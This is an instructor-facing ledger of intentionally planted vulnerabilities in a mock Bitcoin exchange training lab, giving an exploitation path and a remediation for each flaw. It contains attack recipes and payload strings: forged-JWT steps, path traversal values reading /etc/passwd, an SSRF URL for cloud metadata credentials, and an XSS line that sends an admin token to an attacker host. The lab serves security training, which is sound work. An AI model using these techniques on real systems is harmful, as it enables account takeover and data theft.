# Planted Vulnerability Ledger

> Source of truth for every **intentional** vulnerability in BVBE.
> If a flaw exists in the code but is not listed here, it is an
> unintended bug — please open an issue. If a flaw is listed here,
> it is a feature.
>
> This file is part of the lab materials. It is **not** linked from
> any attacker-facing page. It is for instructors, the dev/QA loop,
> and post-exercise debriefs.

## Format

Each entry:

```
### V-NNN: <short title>
- Category: OWASP / Crypto / Business / Infra
- Phase introduced: N.M
- Location: path/to/file.ts:LINE (or "multiple", with list)
- Exploitation path: 1-3 sentence summary of how to trigger it
- Intended discovery difficulty: easy / medium / hard / expert
- Realistic root cause: what a careless developer would have done
- Remediation: how a real team would fix it
- Chain membership: standalone | CHAIN A | CHAIN B | CHAIN C | CHAIN D
```

---

## Phase 0 — Scaffolding & safety rails

**No planted vulnerabilities.** Phase 0 is the clean foundation.

---

## Phase 1 — Authentication & user model

### V-13: Open redirect via login `?next=` parameter

- **Category:** OWASP / Auth
- **Phase introduced:** 1 (relocated from the master plan's Phase-7 slot — login surface lands earlier than withdraw/callback)
- **Location:** `apps/web/app/login/login-form.tsx` (the `nextPath = params.get("next") ?? "/account"` line and the subsequent `router.push(nextPath ...)`)
- **Exploitation path:** Craft a URL like `http://exchange.local/login?next=//attacker.example/phish` or `?next=https://attacker.example`. After successful authentication the SPA passes the raw `next` value to `router.push`; in some Next.js + browser combinations protocol-relative and absolute URLs are honored, navigating the freshly-authenticated user off-origin. Pairs well with a phishing page that mirrors the BVBE login screen and harvests the legitimate access/refresh pair from `postMessage` or referer.
- **Intended discovery difficulty:** easy
- **Realistic root cause:** Engineer copy-pasted a `?next=` pattern from another product without whitelisting the value to same-origin paths. Looks like normal "preserve the user's destination" UX code.
- **Remediation:** Whitelist `next` before pushing — require leading `/` and reject `//` and `/\` prefixes. A small `safeNext(next, fallback)` helper is the canonical fix.
- **Chain membership:** standalone (and an OAuth-code-interception primitive once Phase 1+ social login lands — but we don't have OAuth in scope per locked decisions)

### V-8: JWT alg=none accepted by legacy v1 verifier

- **Category:** OWASP / Auth
- **Phase introduced:** 1
- **Location:** `packages/shared/src/jwt-v1.ts` (`verifyAccessTokenV1` — the `alg === "none"` branch)
- **Exploitation path:** Mint a JWT with header `{"alg":"none","typ":"JWT"}`, an attacker-chosen payload, and an empty signature. Send to `GET /api/v1/auth/me` as `Authorization: Bearer <token>`. The verifier accepts and returns the user identity claimed in the payload.
- **Intended discovery difficulty:** easy
- **Realistic root cause:** Engineer maintaining the "legacy mobile app v1.x" compatibility module forgot to remove the `alg=none` path that supported a brief window of unsigned tokens from early mobile builds.
- **Remediation:** Drop the `alg=none` branch entirely. Reject any header whose `alg` isn't an explicit allow-listed signing algorithm.
- **Chain membership:** standalone (also useful as a foothold for CHAIN A — forge admin claims)

### V-9: Legacy HMAC fallback secret is a known weak default

- **Category:** Auth / Infra
- **Phase introduced:** 1
- **Location:** `apps/web/lib/env.ts` (`JWT_SECRET_LEGACY` schema, `.default("changeme")`) and the `legacySecret` branch in `packages/shared/src/jwt-v1.ts`
- **Exploitation path:** Mint a JWT with `{"alg":"HS256","typ":"JWT"}` (no `kid`). Sign with HMAC-SHA256 using the string `"changeme"`. The v1 verifier reads the missing `kid`, falls through to the env-provided legacy secret which defaults to `"changeme"`, and verifies.
- **Intended discovery difficulty:** easy
- **Realistic root cause:** Engineer added a `.default` on the legacy env var so the v1 verifier would "just work" in dev environments where the variable wasn't set. The default value got committed.
- **Remediation:** Remove the `.default()` so the schema requires explicit configuration; rotate the legacy key out of the codebase.
- **Chain membership:** standalone

### V-10: Password reset token is predictable

- **Category:** Auth
- **Phase introduced:** 1
- **Location:** `apps/web/app/api/v2/auth/password-reset/request/route.ts` (`generateResetToken`)
- **Exploitation path:** Token is `sha256(userId + Date.now()).slice(0, 16)`. Request a reset for the victim's email; the server logs the URL to console. Independently, an attacker who knows a victim's `userId` (leaked via signup race / IDOR) can enumerate `Date.now()` values around their best estimate of the request time (~ms granularity → ~1000 candidates/sec) and brute-force the 16-hex-char token via `POST /api/v2/auth/password-reset/confirm`.
- **Intended discovery difficulty:** easy
- **Realistic root cause:** Engineer wrote "secure-looking" token generation but used `Date.now()` as the only entropy source. Code review didn't catch it because `sha256` made it look strong.
- **Remediation:** Use `crypto.randomBytes(32).toString("base64url")` for the token; store the hash, not the token; constant-time compare.
- **Chain membership:** standalone

### V-19: HS256/RS256 key confusion via JWKS

- **Category:** Auth
- **Phase introduced:** 1
- **Location:** `packages/shared/src/jwt-v1.ts` (HS256 + RS256 branches sharing the same `loadKidKey` lookup) plus `apps/web/app/api/.well-known/jwks.json/route.ts`
- **Exploitation path:** Fetch `/api/.well-known/jwks.json` to obtain the RS256 public key (kid `legacy-2022`). Convert the JWK back to PEM (or read the bytes the v1 verifier will load — same content as `apps/web/keys/legacy-2022`). Mint a JWT with `{"alg":"HS256","kid":"legacy-2022"}` and arbitrary claims; sign with HMAC-SHA256 using the PEM bytes as the HMAC secret. Send to `GET /api/v1/auth/me`. The verifier reads `alg=HS256`, loads the kid-mapped file (PEM bytes), uses them as the HMAC secret, and accepts.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** v1 verifier supports both algorithms with a shared key lookup table. The team didn't realize the algorithm choice should be tied to the key type.
- **Remediation:** Tie algorithm to key type at lookup time; if `kid` maps to an RSA key, only RS256 verification is allowed.
- **Chain membership:** standalone (and a foothold for CHAIN A — forge any role)

### V-20: kid header path traversal

- **Category:** Auth
- **Phase introduced:** 1
- **Location:** `packages/shared/src/jwt-v1.ts` (`loadKidKey`)
- **Exploitation path:** Set `kid` in the JWT header to a path-traversal string like `../../../etc/hostname` or a process-readable file with known contents (e.g., `package.json`). The verifier reads that file and uses its contents as the HMAC secret. Sign the JWT with HMAC-SHA256 using the same file's bytes as secret. Send to `GET /api/v1/auth/me`.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Filesystem-based key rotation pattern that joins `kid` directly into a path without `path.basename()` or any whitelist.
- **Remediation:** Whitelist `kid` against a static set of permitted values, or use `path.basename` and verify the canonical path stays under the keys directory.
- **Chain membership:** standalone

### V-21: Refresh tokens are not single-use

- **Category:** Auth
- **Phase introduced:** 1
- **Location:** `apps/web/app/api/v2/auth/refresh/route.ts` (handler issues a new pair but does not delete or mark the old `RefreshToken`) and `packages/db/prisma/schema.prisma` (no `usedAt` / `revokedAt` field on the model)
- **Exploitation path:** Capture a victim's refresh token (any vector — XSS to localStorage, leaked log line, MITM in a misconfigured deployment). The captured token continues to mint new access tokens for the full 30-day TTL, even after the legitimate user refreshes. Confirm by calling `POST /api/v2/auth/refresh` repeatedly with the same body.
- **Intended discovery difficulty:** hard
- **Realistic root cause:** Engineer assumed refresh tokens are "rotated naturally" because each call returns a new one. Forgot to invalidate the old.
- **Remediation:** Mark the consumed token used (or delete it) in the same DB transaction that creates the new one; reject any refresh whose token-hash row already has `usedAt`.
- **Chain membership:** standalone

### V-35: Next.js middleware bypass via x-middleware-subrequest

- **Category:** Framework / Auth
- **Phase introduced:** 1
- **Location:** `apps/web/middleware.ts` (the early `if (req.headers.get("x-middleware-subrequest")) return NextResponse.next()` branch)
- **Exploitation path:** Send `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` (or any non-empty value) on the request to `GET /api/v2/admin/users` or `POST /api/v2/admin/users`. Middleware short-circuits before the role check. The downstream admin handler trusts `x-bvbe-user-id` (also sent by the attacker) and acts. Useful for listing the full user DB and for minting fresh admin users.
- **Intended discovery difficulty:** hard
- **Realistic root cause:** CVE-2025-29927 shape. Engineer added the header check thinking it would let internal probes skip auth without realizing the header is attacker-controllable.
- **Remediation:** Remove the bypass. If internal subrequests need to skip auth, identify them by something the attacker cannot supply (network position, signed shared secret, etc.).
- **Chain membership:** CHAIN B (component) — bypass to reach the admin mount, plant an admin user, persist.

---

---

## Phase 2 — KYC & identity

### V-14: Path traversal in KYC document download

- **Category:** OWASP / Path traversal
- **Phase introduced:** 2
- **Location:** `apps/web/app/api/v2/me/kyc/doc/route.ts` (`const path = join(UPLOADS_DIR, file)` — no normalization)
- **Exploitation path:** Authenticate as any user (KYC tier 0 is fine; `/api/v2/me/kyc/doc` is auth-gated but not tier-gated). Hit `GET /api/v2/me/kyc/doc?file=../../../etc/hostname`. The handler joins the user-controlled `file` to the uploads directory and `readFileSync` reads outside the intended root. Use `?file=../../../../../../etc/passwd` (or container equivalents like `../../package.json`, `../../keys/legacy-2022`) to grab arbitrary process-readable files.
- **Intended discovery difficulty:** easy
- **Realistic root cause:** Engineer wired up doc downloads via `?file=` for "easy testing" before swapping to a content-addressable URL. The `?file=` path stayed.
- **Remediation:** Look up the document by ID in the DB; serve from `storedPath` and verify the resolved path is contained within `UPLOADS_DIR` via `path.resolve` + prefix check.
- **Chain membership:** standalone (also leaks `apps/web/keys/legacy-2022` → V-19 / V-20 prep)
- **Implementation note (Phase-2 fix-up Q-2.6):** The handler echoes the user-controlled `file` value back in `Content-Disposition: inline; filename="${file}"` on a successful traversal read. This is part of the planted shape — do not "polish" it to `path.basename(file)` thinking it's a separate header-injection concern; the `readFileSync` happens before the header is built, so a polish would only hide evidence, not stop the traversal.

### V-27: Lexicographic KYC tier comparison

- **Category:** Auth / Business logic
- **Phase introduced:** 2 (latent; bug is reachable but no Phase-2 caller triggers the wrong path)
- **Location:** `apps/web/lib/kyc-tier.ts` (`requireTier` — `if (user.kycTier < min)` with `number | string` operands)
- **Exploitation path:** When *any* caller passes a multi-digit tier label as a string (e.g. Phase 4's margin tier system using `"10"`), the JS lexicographic compare ranks `"3" < "10"` as `true` because character `'3' > '1'`. A tier-3 user is reported as below tier `"10"`, *or* a tier-1 user is reported as ≥ tier `"3"` depending on which side is the string. Trainee finds this by either auditing the function or by Phase-4-onwards seeing surprising allow/deny outcomes.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Function accepts `string | number` because some callers pass tier labels from URL/header params. Engineer assumed JS would coerce; it doesn't when both sides are strings.
- **Remediation:** Coerce explicitly: `Number(user.kycTier) < Number(min)`. Better, type the function as `(tier: Tier, min: Tier) => void`.
- **Chain membership:** standalone

### V-40: SSRF in KYC URL-import (CHAIN D component)

- **Category:** SSRF
- **Phase introduced:** 2
- **Location:** `apps/web/app/api/v2/me/kyc/import-url/route.ts` (`isLocalHost` guard — checks only `localhost` / `127.0.0.1` / `::1`)
- **Exploitation path:** Authenticate as a tier-1+ user. POST `{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "type": "address_proof" }` to `/api/v2/me/kyc/import-url`. The guard whitelists the literal strings and rejects nothing else; `169.254.169.254` passes through, the server-side `fetch` hits the mock IMDS container, returns the IAM role name. Repeat with `/latest/meta-data/iam/security-credentials/bvbe-web-instance-role` to get the synthetic `AKIAIOSFODNN7EXAMPLE` credentials, which a later phase will accept against the mock S3 endpoint to complete CHAIN D. Variants: `0.0.0.0`, decimal-encoded IPs (e.g. `2130706433` for `127.0.0.1`), IPv6-mapped (`::ffff:7f00:1`), redirects to internal hosts (the handler follows redirects), and DNS rebinding to a name that resolves first to a public IP and then to `169.254.169.254`.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Engineer added a fast string-equal check thinking "nobody legitimately points us at localhost," missing the wider canonicalisation of "local."
- **Remediation:** Validate via DNS resolution against an IP allowlist for known public CDNs, then `fetch` with `redirect: "error"` and re-verify the final IP. Better: don't accept user URLs at all; require pre-signed cloud-storage URLs with a known vendor host whitelist.
- **Chain membership:** CHAIN D (component) — SSRF → IMDS → IAM creds → mock S3 (Phase 9)

### V-41: Polyglot file upload → stored XSS in admin review

- **Category:** OWASP / XSS / Upload
- **Phase introduced:** 2
- **Location:** `apps/web/app/api/v2/me/kyc/documents/route.ts` (mime detected from filename extension when client sends `application/octet-stream`) + `apps/web/app/api/v2/admin/kyc/[userId]/doc/[docId]/route.ts` (serves verbatim `Content-Type: ${doc.mimeType}`) + `apps/web/app/admin/kyc/[userId]/page.tsx` (renders an iframe per doc whose content is a same-origin Blob URL preserving `mimeType`)
- **Exploitation path:** Sign up, upload a file named `address.html` (or any `.html` extension) for `type: address_proof`. The upload handler infers `mimeType: "text/html"` from the filename extension. Submit for KYC review. When an admin opens `/admin/kyc/<userId>`, the page authedFetches each doc, wraps in a `Blob` with the stored mime, sets a blob URL as the iframe `src`. The iframe renders as `text/html` in the same origin as the admin's session → script executes → reads `window.parent.localStorage["bvbe.access"]` → exfiltrates the admin JWT (e.g., `fetch("http://attacker/?t=" + token)`). Combined with V-35, also enables CHAIN B's persistence step (admin token in hand, plant a new admin user).
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Mime-from-extension is a tutorial-grade upload mistake. Pairing it with serve-verbatim-mime in a same-origin admin tool is the realistic root cause.
- **Remediation:** Whitelist mime types from a sniffed magic-number check; force `Content-Type: application/octet-stream` and `Content-Disposition: attachment` on the admin doc-fetch; render previews in a sandboxed iframe (`sandbox` attribute without `allow-scripts`) and from a separate origin (a `cdn-uploads.bvbe.local` subdomain).
- **Chain membership:** standalone — but a building block for CHAIN B (admin JWT theft is one of two routes to becoming admin)

---

## Phase 3 — Deposits & address management

### V-24: Bitcoin address validation bypass

- **Category:** Crypto / BTC protocol
- **Phase introduced:** 3 (latent; consumed by Phase 7 withdraw)
- **Location:** `packages/shared/src/btc-address.ts` (`isValidBtcAddress`, `normalizeBtcAddress`)
- **Exploitation path:** Multiple bypasses in one function:
  1. **HRP-too-permissive:** validator accepts mainnet `bc1...`, testnet `tb1...`, AND regtest `bcrt1...` bech32 addresses. A Phase-7 withdrawal expecting only mainnet will accept `tb1...` — funds settle at an address whose private key is anyone-can-have (testnet keys are not access-controlled).
  2. **Zero-width strip:** `normalizeBtcAddress` strips U+200B/200C/200D/FEFF before validating. Attacker submits `bc1q​<attacker_suffix>` — the strip turns the visible-looks-like-victim string into the attacker's address. UI may show the original (with zero-widths) to a reviewing admin; server stored the stripped form.
  3. **No checksum verification:** `isBech32Like` only checks HRP + charset; the 6-character Bech32 checksum is not validated. A string with the right alphabet but wrong checksum passes — funds sent to such an address are effectively burned.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Engineer wrote a "permissive validator" to cover mobile clients pasting Unicode-contaminated QR scans and to share a single code path across mainnet / testnet / regtest. Looked fine in dev; ships to production.
- **Remediation:** Reject all HRPs except the deployed network's. Reject zero-width characters instead of stripping. Verify the full Bech32/Bech32m checksum via `bitcoinjs-lib`'s address parser.
- **Chain membership:** standalone — force multiplier in Phase 7 withdraw attacks.

### V-42: Zero-confirmation deposit credit for tier-3 users

- **Category:** Crypto / BTC / Business logic (Mt. Gox flavor)
- **Phase introduced:** 3
- **Location:** `apps/worker/src/deposit-watcher.ts` (`minConfirmationsForTier`)
- **Exploitation path:**
  1. Reach KYC tier 3 (legitimately or via V-35 admin path → set tier in `POST /api/v2/admin/users` or `approve`).
  2. Hit `POST /api/v2/dev/btc/send` (lab affordance) targeting your deposit address. The TX lands in the mock mempool with `confirmations = 0`.
  3. Within ~5 seconds the deposit worker polls, sees the new TX, looks up `minConfirmationsForTier(3) === 0`, and credits `Balance.amount`.
  4. Hit `POST /api/v2/dev/btc/rbf` — next poll detects the original txid is gone (chain returns `confirmations = -1`) and marks the `Deposit` row as `dropped`. **The Balance credit is NOT reversed.** The "we'll add a reconciliation job later" intent is the realistic root cause.
  5. Repeat. Balance grows without on-chain settlement.
- **Intended discovery difficulty:** medium
- **Realistic root cause:** Premium-tier "instant deposits" UX, paired with no reconciliation on RBF drops. Team assumed RBF would be rare; "credit-then-fix-later" felt acceptable.
- **Remediation:** Treat zero-conf balances as `pending` (not spendable) until they confirm. On RBF drop, decrement the pending balance. Or drop the tier-3 exception and apply uniform min-confirmation policy.
- **Chain membership:** standalone

---

## Killer chains — current state

- **CHAIN A — Drain the hot wallet:** components landed = V-19 (forge admin JWT). Remaining: leaked secret + treasury endpoint + PSBT signing flaw (Phase 7-9).
- **CHAIN B — Become admin and persist:** components landed = V-35 (middleware bypass) + V-41 (admin JWT theft via polyglot). Remaining: smuggling at nginx (Phase 9).
- **CHAIN C — Mass user takeover:** no components yet (price feed + self-trade Phase 4).
- **CHAIN D — Exfiltrate full user DB + KYC:** components landed = V-40 (SSRF → mock IMDS → IAM creds). Remaining: mock S3 bucket + DB backup access (Phase 9).
